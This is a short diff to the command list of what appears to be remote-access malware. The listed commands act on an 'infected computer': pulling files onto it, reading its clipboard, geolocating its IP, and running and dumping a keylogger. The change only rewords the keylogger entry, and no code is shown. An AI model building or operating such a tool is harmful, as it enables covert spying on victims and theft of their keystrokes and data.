@@ -38,7 +38,7 @@ Availaible commands are :
 --> !upload = Upload file from website to computer / Syntax = "!upload exemple.com name=file.png" (without quotation mark)
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map
---> !startkeylogger = Starts a powershell keylogger
+--> !startkeylogger = Starts a keylogger
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
 --> !volumemax = Put volume at 100%
